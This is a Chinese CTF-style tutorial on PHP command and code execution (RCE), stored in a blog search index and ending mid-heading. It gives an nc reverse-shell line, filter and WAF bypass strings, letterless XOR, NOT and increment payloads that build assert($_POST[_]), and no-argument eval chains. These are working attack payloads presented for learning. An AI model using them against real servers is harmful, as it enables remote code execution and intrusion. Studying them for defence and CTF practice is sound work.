<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>命令执行漏洞总结</title>
      <link href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p><p>系统命令执行</p><ol><li>system(args)–有回显</li><li>shell_exec(args)–无回显必须输出</li><li>passthru()</li><li>popen(handle,mode)–无回显</li><li>exec(args)–回显最后一行，必须加echo输出</li><li><strong>proc_open()</strong></li><li><strong>`(反单引号)</strong></li></ol><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><p>php代码执行</p><ol><li>assert()a</li><li>preg_replace ( $pattern ,$replacement ,  $subject [,  $limit = -1 [, &amp;$count ]] )</li></ol><p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串</p><ol><li>eval()</li><li>call_user_func (  $callback [, $parameter [, $… ]] )</li></ol><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p><ol><li><strong>call_user_func_array($<strong><strong>callback</strong></strong>,$param_arr)</strong></li></ol><p>把第一个参数作为<strong>回调函数<strong><strong>（</strong></strong>callback****）</strong>调用，把参数数组作（param_arr）为回调函数的的参数传入string </p><ol><li>create_function ( $args , $code )</li></ol><p>该函数的内部实现用到了<code>eval</code>。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p><ol><li>array_map ( callable $callback ,  $array1 [,  $… ] )</li></ol><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p><p>示例</p><pre class="language-none"><code class="language-none">&lt;?php        $a = $_GET['chybeta'];        $b = create_function('$a',"echo $a");        $b('');?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo();&lt;?php        $array = array(0,1,2,3,4,5);        array_map($_GET['chybeta'],$array);?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>（1）管道操作</strong></p><p>将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    </p><p>如：ps aux | grep httpd</p><p><strong>（2）重定向</strong></p><p>改变执行命令时的默认输入输出</p><p>类型操作符用途</p><p>重定向输入                      &lt;                                  从指定文件读取数据而不是从键盘读取</p><p>重定向输出                     &gt;   或&gt;&gt;                      将输出结果覆盖、追加到指定文件（&gt;覆盖、&gt;&gt;追加）</p><p>重定向标准错误输出     2&gt;或 2&gt;&gt;                 将错误信息覆盖或追加到指定文件</p><p>重定向混合输出             &amp;&gt; 或 &amp;&gt;&gt;               将标准输出和错误信息覆盖或追加到指定文件</p><p><strong>（3)逻辑分割</strong></p><p>处理多条命令之间的逻辑关系</p><p>逻辑与                      &amp;&amp;      两条命令都要执行</p><p>逻辑或                     ||           若第一条命令执行成功，则不执行第二条命令（即只要有一条命令成功就不再继续执行命令）</p><p>顺序执行               ;              执行完第一条命令后执行第二条命令</p><p>作用</p><ol><li>读取敏感文件   /etc/passwd</li><li>NC反弹shell</li></ol><p>nc -e /bin/bash 127.0.0.1 3737</p><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>Bash 是GNU操作系统的 shell 或命令语言解释器</p><h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF****绕过"></a><strong>WAF****绕过</strong></h2><h3 id="常见的替换"><a href="#常见的替换" class="headerlink" title="常见的替换"></a>常见的替换</h3><p>空格</p><blockquote><p>&gt;     &lt;       &lt;&gt;</p></blockquote><p>shell下特殊符号</p><p>$(base64编码内容|d -base64)</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a><strong>通配符</strong></h3><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p><pre class="language-none"><code class="language-none">*    代表『 0 个到无穷多个』任意字符?    代表『一定有一个』任意字符[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</code></pre><h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a><strong>连接符</strong></h3><p>引号连接，注意要闭合好</p><p>单引号</p><p>/‘b’i’n’/‘c’a’t’ /‘e’t’c’/‘p’a’s’s’w’d</p><p>双引号</p><p>/“b”i”n”/“w”h”i”c”h” “n”c</p><p>反斜杆</p><p>/b\i\n/w\h\i\c\h n\c</p><h3 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><ul><li><code>&lt;</code> 符号 <code>cat&lt;123</code></li><li><code>\t</code> / <code>%09</code></li><li><code>${IFS}</code> 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li></ul><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h4><ul><li><code>a=l;b=s;$a$b</code></li><li>base64 <code>echo "bHM=" | base64 -d</code></li><li><code>/?in/?s</code> =&gt; <code>/bin/ls</code></li><li>连接符 <code>cat /etc/pass'w'd</code></li><li>未定义的初始化变量 <code>cat$x /etc/passwd</code></li></ul><h2 id="无字母-数字-RCE"><a href="#无字母-数字-RCE" class="headerlink" title="无字母(数字)RCE"></a>无字母(数字)RCE</h2><p>推荐p神的文章–<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p><p>因为很多都是不可见的字符，所以说我就先url编码了一下</p><pre class="language-none"><code class="language-none">a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'P:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'拼接起来：$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08'); //$_=assert$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');  //$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);</code></pre><h3 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h3><p>一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><p>有参数函数要分开运算</p><p>如</p><pre class="language-none"><code class="language-none">system('ls /');(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </code></pre><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p><h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><pre class="language-none"><code class="language-none">&lt;?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p><p>php7特性</p><pre class="language-none"><code class="language-none">&lt;?php'var_dump'('1111'); ("VAR_DUMP")("llll"); echo $_GET[ss];echo $_GET['1'] . '&lt;br/&gt;';echo $_GET[1];$a = '_GET';echo $$a[1];echo `pwd`;</code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a>4.<strong>临时文件</strong></h3><p>利用通配符</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=. /???/????????[@-[];?&gt;</code>，发送数据包如下：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>成功执行任意命令。</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-none"><code class="language-none">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}</code></pre><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b('111'));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET['code'])){if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}else die('nonono');}else echo('please input code');?&gt; </code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir('..')</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" 